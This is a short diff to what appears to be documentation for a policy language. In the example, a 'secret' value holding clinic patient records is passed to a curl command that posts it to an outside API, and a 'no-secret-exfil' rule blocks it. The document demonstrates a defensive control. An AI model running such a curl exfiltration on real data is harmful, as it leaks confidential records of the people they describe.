@@ -72,10 +72,10 @@ var @policyConfig = {
 }
 policy @p = union(@policyConfig)
 
-var secret @token = "sk-live-abc123"
+var secret @patientRecords = <clinic/patients.csv>
 exe net:w @post(data) = run cmd { curl -d "@data" https://api.example.com }
 
-show @post(@token)
+show @post(@patientRecords)
 ```
 
 Error: `Rule 'no-secret-exfil': label 'secret' cannot flow to 'exfil'`
